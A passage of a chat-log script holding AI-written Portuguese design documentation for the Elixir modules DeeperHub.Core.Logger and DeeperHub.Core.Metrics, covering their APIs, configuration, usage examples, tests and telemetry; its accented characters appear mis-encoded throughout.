2.  **`DeeperHub.Core.Logger` (Fachada):**
    *   Obt√©m o contexto de `DeeperHub.Shared.Logging.Context.get_all()`.
    *   Obt√©m o `trace_id` de `DeeperHub.Shared.Logging.DistributedTracing.current_trace_id()`.
    *   Combina os metadados fornecidos, contexto autom√°tico e contexto do processo.
    *   Encaminha a mensagem, n√≠vel e metadados combinados para o `DeeperHub.Core.Logger.Adapter`.
3.  **`DeeperHub.Core.Logger.Adapter` (ex: `StructuredLoggerAdapter`):**
    *   Recebe os dados do log.
    *   (Opcional) Enfileira o log para processamento ass√≠ncrono se for um GenServer.
    *   Formata o log em uma estrutura padronizada (ex: JSON), incluindo timestamp, n√≠vel, mensagem, m√≥dulo, fun√ß√£o, trace_id, e todos os metadados.
    *   **Chama o `LogSanitizer` para remover/mascarar dados sens√≠veis do log formatado.**
    *   Para cada backend de logging configurado:
        *   Verifica se o n√≠vel do log atual √© igual ou superior ao n√≠vel configurado para o backend.
        *   Se sim, envia o log sanitizado e formatado para o backend.
4.  **Backend de Logging:**
    *   Escreve o log no destino (console, arquivo, servi√ßo externo).

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

As fun√ß√µes principais j√° foram vistas na documenta√ß√£o original (`debug/3`, `info/3`, `warn/3`, `error/3`, `critical/3`). A principal mudan√ßa √© a adi√ß√£o de `module` como primeiro argumento ou a captura autom√°tica via macro, e metadados como √∫ltimo argumento.

### Exemplo de API Refinada (usando m√≥dulo como primeiro argumento):

```elixir
defmodule DeeperHub.Core.Logger do
  # ... (macros para capturar __ENV__.function, etc. podem estar aqui) ...

  defp call_adapter(level, module, message_or_fun, metadata) do
    # L√≥gica para obter contexto, trace_id, etc.
    # L√≥gica para avaliar message_or_fun se for uma fun√ß√£o
    # ...
    # DeeperHub.Core.Logger.Adapter.log(level, full_context_map_with_message)
  end

  def debug(module, message_or_fun, metadata \\\\ %{}) do
    call_adapter(:debug, module, message_or_fun, metadata)
  end

  def info(module, message_or_fun, metadata \\\\ %{}) do
    call_adapter(:info, module, message_or_fun, metadata)
  end

  def warn(module, message_or_fun, metadata \\\\ %{}) do
    call_adapter(:warn, module, message_or_fun, metadata)
  end

  def error(module, message_or_fun, metadata \\\\ %{}) do
    call_adapter(:error, module, message_or_fun, metadata)
  end

  def critical(module, message_or_fun, metadata \\\\ %{}) do
    call_adapter(:critical, module, message_or_fun, metadata)
  end

  # Fun√ß√µes para gerenciar contexto (delegam para DeeperHub.Shared.Logging.Context)
  def set_context(metadata_map), do: DeeperHub.Shared.Logging.Context.put(metadata_map)
  def put_context(key, value), do: DeeperHub.Shared.Logging.Context.put(key, value)
  def get_context(), do: DeeperHub.Shared.Logging.Context.get_all()
  def clear_context(), do: DeeperHub.Shared.Logging.Context.clear()

  # Fun√ß√µes para gerenciar trace_id (delegam para DeeperHub.Shared.Logging.DistributedTracing)
  def start_trace(name, metadata \\\\ %{}), do: DeeperHub.Shared.Logging.DistributedTracing.start_trace(name, metadata)
  # ... outros ...
end
```

## ‚öôÔ∏è 7. Configura√ß√£o

Configura√ß√µes gerenciadas pelo `DeeperHub.Core.ConfigManager`:

*   `[:core, :logger, :level]` (Atom): N√≠vel de log global padr√£o (ex: `:info`). (Padr√£o: `:info` para prod, `:debug` para dev).
*   `[:core, :logger, :format]` (Atom): Formato de log padr√£o (:json, :text). (Padr√£o: `:json` para prod, `:text` para dev).
*   `[:core, :logger, :backends]` (List de Maps): Configura√ß√£o dos backends de logging.
    Exemplo:
    ```elixir
    [
      %{
        name: :console,
        adapter: Logger.Backends.Console,
        level: :debug, # N√≠vel espec√≠fico para este backend
        format: :text, # Formato espec√≠fico
        metadata: [:request_id, :user_id] # Metadados a incluir
      },
      %{
        name: :file,
        adapter: Logger.Backends.File,
        path: \"/var/log/deeper_hub/app.log\",
        level: :info,
        format: :json,
        rotation: %{size: 10_000_000, keep: 5} # Rota√ß√£o de 10MB, manter 5 arquivos
      },
      %{
        name: :datadog,
        adapter: MyApp.DatadogLoggerBackend, # Adaptador customizado
        api_key: {:system, \"DATADOG_API_KEY\"},
        level: :warn
      }
    ]
    ```
*   `[:core, :logger, :sanitizer, :enabled]` (Boolean): Habilita/desabilita a sanitiza√ß√£o de logs. (Padr√£o: `true`)
*   `[:core, :logger, :sanitizer, :sensitive_keys]` (List de Strings/Atoms): Lista de chaves a serem sanitizadas.
*   `[:core, :logger, :context, :auto_include_pid]` (Boolean): Inclui PID automaticamente. (Padr√£o: `true`)
*   `[:core, :logger, :context, :auto_include_trace_id]` (Boolean): Inclui Trace ID automaticamente. (Padr√£o: `true`)
*   (Opcional, se `DeeperHub.Logger.Config` for usado) `[:logger, :emojis, :info]` (String): Emoji para logs de info.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configura√ß√µes de logging.
*   `DeeperHub.Shared.Logging.Context`: Para gerenciamento de contexto de log por processo.
*   `DeeperHub.Shared.Logging.DistributedTracing`: Para obter Trace IDs.
*   `DeeperHub.Security.LogSanitizer` (ou similar): Para sanitizar dados sens√≠veis.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar o `StructuredLogger` GenServer.

### 8.2. Bibliotecas Externas

*   `Logger` (Elixir Standard Library): Usado como base para a funcionalidade de logging.
*   `Jason` (ou similar): Se o formato de log JSON for o padr√£o.
*   Bibliotecas de clientes para servi√ßos de logging externos (ex: `Dogstatsd` para Datadog), se aplic√°vel.

## ü§ù 9. Como Usar / Integra√ß√£o

**Registro B√°sico:**
```elixir
alias DeeperHub.Core.Logger

def my_function(user_id) do
  Logger.info(__MODULE__, \"Iniciando processamento para usu√°rio.\", %{user_id: user_id})
  # ...
  Logger.debug(__MODULE__, \"Dados intermedi√°rios.\", %{data: some_data})
  # ...
  {:ok, \"resultado\"}
rescue
  e ->
    Logger.error(__MODULE__, \"Erro durante processamento.\", %{user_id: user_id, error: Exception.message(e), stacktrace: Exception.stacktrace(e)})
    {:error, :processing_failed}
end
```

**Usando Contexto de Log:**
```elixir
alias DeeperHub.Core.Logger

def handle_request(conn, params) do
  request_id = conn.private[:request_id] # Exemplo de como obter um request_id
  Logger.set_context(%{request_id: request_id, user_id: conn.assigns.current_user_id})

  process_data(params) # Logger.info dentro de process_data incluir√° request_id e user_id

  Logger.clear_context() # Limpar contexto ao final da requisi√ß√£o
  conn
end

defp process_data(params) do
  Logger.info(__MODULE__, \"Processando dados do formul√°rio.\", %{form_params: params})
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar se os logs s√£o formatados corretamente para diferentes n√≠veis e com metadados.
*   Verificar se a sanitiza√ß√£o de dados sens√≠veis est√° funcionando.
*   Testar a configura√ß√£o e o direcionamento para diferentes backends.
*   Testar a funcionalidade de contexto de log.
*   Localiza√ß√£o: `test/deeper_hub/core/logger/` e `test/deeper_hub/shared/logging/`.

### 10.2. M√©tricas

*   `deeper_hub.core.logger.logs_written.count` (tags: `level`, `backend_name`): N√∫mero de logs escritos.
*   `deeper_hub.core.logger.log_processing.duration_ms` (Histograma, tags: `backend_name`): Tempo para processar e enviar um log para um backend.
*   `deeper_hub.core.logger.logs_sanitized.count` (Contador): N√∫mero de logs que passaram pela sanitiza√ß√£o.
*   `deeper_hub.core.logger.logs_dropped.count` (tags: `reason`, `backend_name`): N√∫mero de logs descartados (ex: devido a n√≠vel de log do backend).

### 10.3. Logs (do pr√≥prio Logger)

O sistema de logging em si tamb√©m deve gerar logs sobre sua opera√ß√£o, especialmente em n√≠veis mais altos:
*   **N√≠vel INFO:** Inicializa√ß√£o do Logger, configura√ß√£o de backends, rota√ß√£o de arquivos de log.
*   **N√≠vel WARNING:** Falha tempor√°ria ao escrever em um backend (com retentativa).
*   **N√≠vel ERROR:** Falha persistente ao escrever em um backend, erro de configura√ß√£o de backend, falha na sanitiza√ß√£o.

### 10.4. Telemetria

Eventos Telemetry podem ser emitidos para:
*   `[:deeper_hub, :core, :logger, :log_processed, :start | :stop | :exception]`
    *   Metadados: `%{level: level, backend: backend_name, message_size: size, metadata_keys: keys}`

## ‚ùå 11. Tratamento de Erros

*   **Falha de Backend:** Se um backend de logging falhar (ex: servi√ßo externo indispon√≠vel), o `Logger.Adapter` deve tratar o erro graciosamente, registrar a falha (possivelmente usando outro backend mais confi√°vel como o console) e continuar tentando enviar para outros backends configurados. N√£o deve travar o processo chamador.
*   **Erro de Formata√ß√£o/Sanitiza√ß√£o:** Erros internos na formata√ß√£o ou sanitiza√ß√£o devem ser capturados, logados (de forma segura) e n√£o devem impedir o fluxo da aplica√ß√£o.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Sanitiza√ß√£o √© Crucial:** A integra√ß√£o com o `LogSanitizer` √© a principal medida de seguran√ßa para evitar vazamento de dados sens√≠veis.
*   **N√≠veis de Log em Produ√ß√£o:** O n√≠vel de log global e dos backends deve ser configurado apropriadamente para produ√ß√£o (geralmente `:info` ou `:warn`) para evitar excesso de logs e exposi√ß√£o de dados de debug.
*   **Acesso aos Logs:** Arquivos de log e plataformas de logging centralizado devem ter controle de acesso rigoroso.
*   **N√£o Logar Informa√ß√£o Desnecess√°ria:** Evitar logar objetos completos ou estruturas de dados grandes se apenas algumas informa√ß√µes s√£o relevantes.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Sempre use a fachada `DeeperHub.Core.Logger` para registrar logs.
*   Forne√ßa metadados ricos e estruturados.
*   Use o n√≠vel de log apropriado para a mensagem.
*   Tenha cuidado para n√£o logar dados sens√≠veis diretamente; confie na sanitiza√ß√£o, mas seja consciente.
*   Para fluxos complexos, utilize `Logger.set_context/1` para enriquecer todos os logs dentro daquele fluxo com identificadores comuns.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar amostragem de logs de debug/info em produ√ß√£o para reduzir volume, mas ainda capturar informa√ß√µes √∫teis.
*   [ ] Adicionar a capacidade de alterar n√≠veis de log de backends espec√≠ficos em tempo de execu√ß√£o via `ConfigManager`.
*   [ ] Desenvolver mais `LogBackends` customizados para integra√ß√µes populares (ex: ELK Stack, Splunk).
*   [ ] Permitir filtros mais avan√ßados nos backends (ex: logar apenas certos m√≥dulos para um backend espec√≠fico).
*   [ ] Melhorar a performance do processamento ass√≠ncrono de logs sob alta carga.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Pr√≥ximo? Talvez `DeeperHub.Auth` ou `DeeperHub.Core.Metrics`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Combinado! Vamos agora detalhar o `DeeperHub.Core.Metrics`, outro pilar da observabilidade.

---

# M√≥dulo: `DeeperHub.Core.Metrics` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.Metrics`

O m√≥dulo `DeeperHub.Core.Metrics` √© a fachada centralizada para a coleta, registro e exposi√ß√£o de m√©tricas de desempenho e sa√∫de do sistema DeeperHub. Ele fornece uma API unificada para que todos os outros m√≥dulos possam registrar m√©tricas de forma consistente, abstraindo a implementa√ß√£o do backend de m√©tricas (ex: Prometheus, StatsD, InfluxDB, ou um coletor ETS interno).

O objetivo principal √© fornecer dados quantitativos sobre o comportamento da aplica√ß√£o, permitindo monitoramento em tempo real, alertas sobre anomalias, an√°lise de tend√™ncias de desempenho e otimiza√ß√£o de recursos. üòä

*(Nota: A documenta√ß√£o original menciona `DeeperHub.Core.MetricsFacade` e `DeeperHub.Shared.Metrics.MetricsFacade`. Esta documenta√ß√£o consolida em `DeeperHub.Core.Metrics` como a fachada principal, que delegaria para uma implementa√ß√£o mais robusta como `DeeperHub.Shared.Metrics.Services.EtsMetricsService` ou um adaptador para um sistema externo.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Interface de Registro de M√©tricas Unificada:**
    *   Fornecer fun√ß√µes para diferentes tipos de m√©tricas:
        *   **Contadores (`increment/3`, `decrement/3`):** Para valores que s√≥ aumentam ou diminuem (ex: n√∫mero de requisi√ß√µes, erros).
        *   **Gauges (`gauge/3`):** Para valores que podem subir e descer arbitrariamente (ex: n√∫mero de usu√°rios ativos, uso de mem√≥ria).
        *   **Histogramas/Distribui√ß√µes (`histogram/3`, `record_timing/3`):** Para rastrear a distribui√ß√£o estat√≠stica de um conjunto de valores (ex: lat√™ncia de requisi√ß√µes, tamanho de payloads).
        *   **Timers (`start_timer/2`, `stop_timer/1` ou fun√ß√£o wrapper):** Para medir a dura√ß√£o de opera√ß√µes.
*   **Suporte a Tags/Labels:**
    *   Permitir a adi√ß√£o de tags (pares chave-valor) √†s m√©tricas para segmenta√ß√£o e filtragem (ex: `endpoint=\"/users\"`, `status_code=\"200\"`).
*   **Nomea√ß√£o Consistente de M√©tricas:**
    *   Promover ou impor um esquema de nomea√ß√£o hier√°rquico para m√©tricas (ex: `deeper_hub.http.requests.duration_ms`).
*   **Abstra√ß√£o de Backend:**
    *   Delegar o armazenamento e a exposi√ß√£o real das m√©tricas para um adaptador configur√°vel, permitindo a integra√ß√£o com diferentes sistemas de monitoramento.
*   **Coleta Autom√°tica de M√©tricas do Sistema (Opcional):**
    *   Integrar com um `SystemMonitor` para coletar automaticamente m√©tricas b√°sicas do sistema (CPU, mem√≥ria, etc.).
*   **Agrega√ß√£o e Sumariza√ß√£o (B√°sica):**
    *   Fornecer funcionalidades para obter resumos ou valores atuais de m√©tricas (principalmente para backends em mem√≥ria como ETS ou para dashboards de depura√ß√£o).
*   **Exporta√ß√£o de M√©tricas (via Adaptador):**
    *   Permitir que os adaptadores exponham as m√©tricas em formatos padronizados (ex: formato Prometheus).
*   **Alertas Baseados em M√©tricas (Integra√ß√£o):**
    *   Fornecer os dados para um sistema de alertas (`DeeperHub.Shared.Metrics.AlertsSystem`) que monitora m√©tricas e dispara alertas quando limiares s√£o cruzados.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.Metrics` (Fachada P√∫blica):**
    *   **Responsabilidade:** Ponto de entrada para todos os m√≥dulos registrarem m√©tricas.
    *   **Intera√ß√µes:** Formata nomes de m√©tricas e tags, e delega para o `DeeperHub.Core.Metrics.Adapter`.
2.  **`DeeperHub.Core.Metrics.Adapter` (Behaviour e Implementa√ß√£o Padr√£o):**
    *   **Responsabilidade:** Abstrair a l√≥gica de intera√ß√£o com o backend de m√©tricas.
    *   **Comportamento (`MetricsBehaviour`):** Define a interface que os adaptadores devem implementar.
    *   **Implementa√ß√£o Padr√£o (`DefaultMetricsAdapter` que usa `DeeperHub.Shared.Metrics.Services.EtsMetricsService` ou similar):**
        *   Recebe as chamadas da fachada.
        *   Interage com o sistema de armazenamento de m√©tricas (ex: ETS, ou um cliente para Prometheus/StatsD).
        *   Pode envolver um GenServer para opera√ß√µes ass√≠ncronas ou agrega√ß√£o em lote, dependendo do backend.
3.  **`DeeperHub.Shared.Metrics.Services.EtsMetricsService` (Exemplo de Backend em Mem√≥ria):**
    *   **Responsabilidade:** Armazenar e agregar m√©tricas em tabelas ETS.
    *   **Componentes Internos (como visto na documenta√ß√£o original):**
        *   `EtsMetricsCounter`: Para contadores.
        *   `EtsMetricsHistogram`: Para gauges e histogramas.
4.  **`DeeperHub.Shared.Metrics.ModuleMetrics`:**
    *   **Responsabilidade:** Coletar m√©tricas espec√≠ficas de diferentes m√≥dulos do sistema (ex: n√∫mero de usu√°rios ativos do m√≥dulo `Accounts`). Pode ser chamado por um `CollectorWorker`.
5.  **`DeeperHub.Shared.Metrics.CollectorWorker` (GenServer):**
    *   **Responsabilidade:** Executar tarefas de coleta de m√©tricas periodicamente (ex: chamar `ModuleMetrics.collect_all_module_metrics`).
6.  **`DeeperHub.Shared.Metrics.AlertsSystem` (GenServer):**
    *   **Responsabilidade:** Monitorar m√©tricas contra limiares definidos e gerenciar alertas.
7.  **`DeeperHub.Shared.Metrics.ApiExporter`:**
    *   **Responsabilidade:** Formatar m√©tricas para serem expostas via uma API (ex: endpoint `/metrics` no formato Prometheus).
8.  **`DeeperHub.Shared.Metrics.ExportWorker` (GenServer):**
    *   **Responsabilidade:** Exportar m√©tricas periodicamente para sistemas externos (se configurado).

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/core/metrics/
‚îú‚îÄ‚îÄ metrics.ex                    # Fachada P√∫blica
‚îú‚îÄ‚îÄ adapter.ex                    # Behaviour e Default Adapter
‚îÇ
‚îú‚îÄ‚îÄ backends/                     # (Opcional) Adaptadores para backends espec√≠ficos (Prometheus, StatsD)
‚îÇ   ‚îî‚îÄ‚îÄ prometheus_adapter.ex
‚îÇ
‚îî‚îÄ‚îÄ supervisor.ex                 # Supervisor para processos do Core.Metrics (se houver)

lib/deeper_hub/shared/metrics/    # Componentes compartilhados do sistema de m√©tricas
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ ets_metrics_service.ex    # Implementa√ß√£o ETS
‚îÇ   ‚îú‚îÄ‚îÄ ets_metrics_counter.ex
‚îÇ   ‚îî‚îÄ‚îÄ ets_metrics_histogram.ex
‚îÇ
‚îú‚îÄ‚îÄ alerts_system.ex              # Gerenciador de alertas
‚îú‚îÄ‚îÄ api_exporter.ex               # Exportador para API
‚îú‚îÄ‚îÄ collector_worker.ex           # Worker para coleta peri√≥dica
‚îú‚îÄ‚îÄ export_worker.ex              # Worker para exporta√ß√£o peri√≥dica
‚îú‚îÄ‚îÄ module_metrics.ex             # Coleta de m√©tricas de m√≥dulos
‚îú‚îÄ‚îÄ system_monitor.ex             # Coleta de m√©tricas do sistema (CPU, mem)
‚îú‚îÄ‚îÄ supervisor.ex                 # Supervisor para os workers e services de Shared.Metrics
‚îú‚îÄ‚îÄ telemetry.ex                  # (Opcional) Se o pr√≥prio sistema de m√©tricas emitir telemetria sobre sua opera√ß√£o
‚îî‚îÄ‚îÄ types.ex                      # Defini√ß√µes de tipos comuns de m√©tricas
```

### 3.3. Decis√µes de Design Importantes

*   **API Simples e Flex√≠vel:** A fachada `Core.Metrics` deve ser f√°cil de usar, com fun√ß√µes claras para cada tipo de m√©trica.
*   **Performance:** O registro de m√©tricas deve ter um impacto m√≠nimo no desempenho das opera√ß√µes principais. Opera√ß√µes custosas de agrega√ß√£o ou exporta√ß√£o devem ser ass√≠ncronas.
*   **Padroniza√ß√£o de Nomes e Tags:** √â crucial para a usabilidade e integra√ß√£o com ferramentas de monitoramento.
*   **Extensibilidade de Backend:** A arquitetura deve permitir a f√°cil adi√ß√£o de novos adaptadores para diferentes sistemas de monitoramento.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Monitorar Taxa de Requisi√ß√µes HTTP:**
    *   Um plug na pipeline Phoenix chama `DeeperHub.Core.Metrics.increment([:http, :requests, :total], 1, %{path: \"/api/users\", method: \"GET\"})`.
    *   Outro contador √© incrementado para o status code: `DeeperHub.Core.Metrics.increment([:http, :requests, :status_codes], 1, %{code: \"200\"})`.
*   **Medir Lat√™ncia de Banco de Dados:**
    *   `stop_timer_fn = DeeperHub.Core.Metrics.start_timer([:database, :query, :duration_ms], %{query_name: \"get_user_by_id\"})`
    *   Executa a query.
    *   `stop_timer_fn.()`
*   **Rastrear N√∫mero de Usu√°rios Ativos:**
    *   Um worker peri√≥dico chama uma fun√ß√£o no m√≥dulo `Accounts` que retorna o n√∫mero de usu√°rios ativos.
    *   O worker ent√£o chama `DeeperHub.Core.Metrics.gauge([:application, :users, :active_count], count)`.
*   **Alertar sobre Alto Uso de CPU:**
    *   `DeeperHub.Shared.Metrics.SystemMonitor` coleta o uso de CPU.
    *   `DeeperHub.Shared.Metrics.AlertsSystem` verifica essa m√©trica contra um limiar e, se excedido, dispara um alerta que pode ser enviado via `DeeperHub.Notifications`.

## üåä 5. Fluxos Importantes

### Fluxo de Registro de M√©trica (Ex: Contador)

1.  **M√≥dulo Chamador:** Chama `DeeperHub.Core.Metrics.increment([:my_service, :event_processed], 1, %{type: \"A\"})`.
2.  **`DeeperHub.Core.Metrics` (Fachada):**
    *   Normaliza o nome da m√©trica (ex: para `\"deeper_hub.my_service.event_processed.count\"`).
    *   Normaliza as tags.
    *   Delega para `DeeperHub.Core.Metrics.Adapter.increment(normalized_name, value, normalized_tags)`.
3.  **`DeeperHub.Core.Metrics.Adapter` (ex: `DefaultMetricsAdapter` usando `EtsMetricsService`):**
    *   Chama `DeeperHub.Shared.Metrics.Services.EtsMetricsService.increment(normalized_name, value, normalized_tags)`.
4.  **`DeeperHub.Shared.Metrics.Services.EtsMetricsService`:**
    *   Usa `EtsMetricsCounter` para encontrar ou criar a entrada ETS para a m√©trica (combinando nome e tags) e incrementa seu valor.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

*(A documenta√ß√£o original de `DeeperHub.Core.MetricsFacade` e `DeeperHub.Shared.Metrics.MetricsFacade` j√° lista a maioria das fun√ß√µes necess√°rias. A ideia √© consolid√°-las sob `DeeperHub.Core.Metrics` e garantir clareza.)*

### 6.1. `DeeperHub.Core.Metrics.increment(name :: list(atom()) | String.t(), value :: integer() | nil, tags :: map() | nil) :: :ok`

*   **Descri√ß√£o:** Incrementa uma m√©trica de contador.
*   **`@spec`:** `increment(name :: list(atom()) | String.t(), value :: integer() | nil, tags :: map() | nil) :: :ok`
*   **Par√¢metros:**
    *   `name`: Nome da m√©trica (ex: `[:http, :requests]` ou `\"http.requests\"`).
    *   `value`: Valor a incrementar. (Padr√£o: `1`)
    *   `tags`: Mapa de tags para dimensionalidade. (Padr√£o: `%{}`)
*   **Exemplo:** `Metrics.increment([:orders, :processed], 1, %{region: \"us-east\"})`

### 6.2. `DeeperHub.Core.Metrics.decrement(name :: list(atom()) | String.t(), value :: integer() | nil, tags :: map() | nil) :: :ok`

*   **Descri√ß√£o:** Decrementa uma m√©trica de contador.
*   *(Par√¢metros e exemplo similares a `increment/3`)*

### 6.3. `DeeperHub.Core.Metrics.gauge(name :: list(atom()) | String.t(), value :: number(), tags :: map() | nil) :: :ok`

*   **Descri√ß√£o:** Define o valor de uma m√©trica do tipo gauge.
*   **Exemplo:** `Metrics.gauge([:system, :memory, :usage_mb], 512.5, %{server_id: \"app-01\"})`

### 6.4. `DeeperHub.Core.Metrics.histogram(name :: list(atom()) | String.t(), value :: number(), tags :: map() | nil) :: :ok`

*   **Descri√ß√£o:** Registra um valor em uma m√©trica de histograma (ou distribui√ß√£o).
*   **Exemplo:** `Metrics.histogram([:api, :request_latency_ms], 123.4, %{endpoint: \"/users\"})`

### 6.5. `DeeperHub.Core.Metrics.record_timing(name :: list(atom()) | String.t(), value_microseconds :: non_neg_integer(), tags :: map() | nil) :: :ok`

*   **Descri√ß√£o:** Atalho para registrar uma dura√ß√£o em um histograma, tipicamente em microssegundos ou milissegundos.
*   **Exemplo:** `Metrics.record_timing([:db, :query, :duration_us], 56789, %{query_name: \"get_user\"})`

### 6.6. `DeeperHub.Core.Metrics.start_timer(name :: list(atom()) | String.t(), tags :: map() | nil) :: function()`

*   **Descri√ß√£o:** Inicia um timer e retorna uma fun√ß√£o. Chamar a fun√ß√£o retornada para o timer e registra a dura√ß√£o. A dura√ß√£o √© geralmente registrada em microssegundos.
*   **Exemplo:**
    ```elixir
    stop_fn = Metrics.start_timer([:service_call, :duration_us], %{service: \"payment\"})
    # ... fazer a chamada ao servi√ßo ...
    stop_fn.()
    ```

### 6.7. `DeeperHub.Core.Metrics.get_metric(name :: String.t(), tags :: map() | nil) :: {:ok, value :: term()} | {:error, :not_found}`

*   **Descri√ß√£o:** Obt√©m o valor atual de uma m√©trica espec√≠fica (principalmente para backends em mem√≥ria).
*   *(`name` aqui seria a string normalizada completa, ex: `\"deeper_hub.http.requests.total.count\"`)*

### 6.8. `DeeperHub.Core.Metrics.get_metrics_summary(prefix :: String.t() | nil) :: {:ok, map()}`

*   **Descri√ß√£o:** Obt√©m um resumo das m√©tricas, opcionalmente filtrado por um prefixo.

## ‚öôÔ∏è 7. Configura√ß√£o

Configura√ß√µes gerenciadas pelo `DeeperHub.Core.ConfigManager`:

*   `[:core, :metrics, :enabled]` (Boolean): Habilita/desabilita todo o sistema de m√©tricas. (Padr√£o: `true`)
*   `[:core, :metrics, :adapter]` (Module): M√≥dulo adaptador de m√©tricas a ser usado (ex: `DeeperHub.Shared.Metrics.Services.EtsMetricsService`, `MyApp.PrometheusAdapter`). (Padr√£o: `DeeperHub.Shared.Metrics.Services.EtsMetricsService`)
*   `[:core, :metrics, :default_prefix]` (String): Prefixo padr√£o para todos os nomes de m√©tricas (ex: `\"deeper_hub\"`). (Padr√£o: `\"deeper_hub\"`)
*   `[:core, :metrics, :ets_metrics_service, :cleanup_interval_ms]` (Integer): Intervalo para limpeza de m√©tricas antigas no `EtsMetricsService`.
*   `[:core, :metrics, :collector_worker, :collection_interval_ms]` (Integer): Intervalo para o `CollectorWorker` coletar m√©tricas de m√≥dulos. (Padr√£o: `60000`)
*   `[:core, :metrics, :export_worker, :export_interval_ms]` (Integer): Intervalo para o `ExportWorker` enviar m√©tricas para backends externos. (Padr√£o: `30000`)
*   `[:core, :metrics, :export_worker, :exporters]` (List de Maps): Configura√ß√£o dos exportadores. Ex: `[%{adapter: MyApp.StatsDExporter, host: \"localhost\", port: 8125}]`
*   `[:core, :metrics, :alerts_system, :check_interval_ms]` (Integer): Intervalo para o `AlertsSystem` verificar regras de alerta. (Padr√£o: `60000`)
*   `[:core, :metrics, :alerts_system, :rules]` (List de Maps): Defini√ß√£o das regras de alerta.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configura√ß√µes do sistema de m√©tricas.
*   `DeeperHub.Core.Logger`: Para logging de opera√ß√µes internas do sistema de m√©tricas.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar os processos de m√©tricas (workers, GenServers).
*   `DeeperHub.Shared.Utils`: Para utilit√°rios de nomea√ß√£o e manipula√ß√£o de tags.

### 8.2. Bibliotecas Externas

*   Pode depender de bibliotecas de clientes para sistemas de m√©tricas espec√≠ficos (ex: `Exometer` (embora talvez seja um backend pr√≥prio), `Prometheus.Ex`, `Statix`).
*   `Telemetry` e `Telemetry.Metrics` (Elixir): Para uma base de instrumenta√ß√£o, especialmente se os adaptadores se integrarem com `Telemetry.Metrics`.

## ü§ù 9. Como Usar / Integra√ß√£o

**Registrando um contador:**
```elixir
alias DeeperHub.Core.Metrics

def handle_new_user(params) do
  # ... l√≥gica ...
  Metrics.increment([:users, :registered], 1, %{source: params.registration_source})
end
```

**Medindo a dura√ß√£o de uma fun√ß√£o:**
```elixir
alias DeeperHub.Core.Metrics

def process_payment(payment_id) do
  stop_timer_fn = Metrics.start_timer([:payments, :processing, :duration_us], %{payment_id: payment_id})
  
  result = do_actual_payment_processing(payment_id) # Fun√ß√£o real
  
  stop_timer_fn.() # Registra a dura√ß√£o
  result
end
```

**Definindo um gauge:**
```elixir
alias DeeperHub.Core.Metrics

def update_active_connections_gauge(count) do
  Metrics.gauge([:connections, :active_total], count, %{type: \"websocket\"})
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar se os diferentes tipos de m√©tricas (`increment`, `gauge`, `histogram`, `timer`) s√£o registrados corretamente pelo adaptador configurado.
*   Verificar se as tags s√£o associadas corretamente.
*   Testar a obten√ß√£o de resumos e valores espec√≠ficos de m√©tricas (especialmente para adaptadores em mem√≥ria).
*   Testar os workers (`CollectorWorker`, `ExportWorker`, `AlertsSystem`) para garantir que executam suas tarefas periodicamente e corretamente.
*   Localiza√ß√£o: `test/deeper_hub/core/metrics/` e `test/deeper_hub/shared/metrics/`.

### 10.2. M√©tricas (do pr√≥prio sistema de M√©tricas - Meta-M√©tricas)

*   `deeper_hub.core.metrics.adapter.operations.count` (tags: `type` (`increment`, `gauge`, etc.), `adapter_name`, `status` (`:ok`, `:error`)): N√∫mero de opera√ß√µes de registro de m√©tricas.
*   `deeper_hub.core.metrics.adapter.operations.duration_ms` (Histograma, tags: `type`, `adapter_name`): Dura√ß√£o das opera√ß√µes de registro.
*   `deeper_hub.core.metrics.collector_worker.runs.count` (tags: `status` (`:ok`, `:error`)): N√∫mero de execu√ß√µes do coletor.
*   `deeper_hub.core.metrics.export_worker.runs.count` (tags: `exporter_name`, `status` (`:ok`, `:error`)): N√∫mero de execu√ß√µes do exportador.
*   `deeper_hub.core.metrics.alerts_system.alerts_triggered.count` (tags: `rule_id`, `severity`): N√∫mero de alertas disparados.

### 10.3. Logs

*   **N√≠vel INFO:** Inicializa√ß√£o do sistema de m√©tricas, configura√ß√£o de adaptadores, execu√ß√£o de workers.
*   **N√≠vel WARNING:** Falha ao registrar uma m√©trica em um backend espec√≠fico (com retentativa, se aplic√°vel), falha na coleta de m√©tricas de um m√≥dulo.
*   **N√≠vel ERROR:** Falha cr√≠tica na inicializa√ß√£o, falha persistente em um adaptador de backend, erro na configura√ß√£o de regras de alerta.

### 10.4. Telemetria

O pr√≥prio sistema de m√©tricas pode emitir eventos Telemetry sobre suas opera√ß√µes internas, permitindo que outros sistemas de observabilidade (ou at√© mesmo ele pr√≥prio de forma recursiva, com cuidado) capturem esses dados.
*   `[:deeper_hub, :core, :metrics, :record, :start | :stop | :exception]`
    *   Metadados: `%{metric_name: name, type: type, tags: tags}`
*   `[:deeper_hub, :shared, :metrics, :collector_worker, :run, :start | :stop | :exception]`
*   `[:deeper_hub, :shared, :metrics, :export_worker, :run, :start | :stop | :exception]`
    *   Metadados: `%{exporter: exporter_name}`
*   `[:deeper_hub, :shared, :metrics, :alerts_system, :rule_check, :start | :stop | :exception]`
    *   Metadados: `%{rule_id: id}`
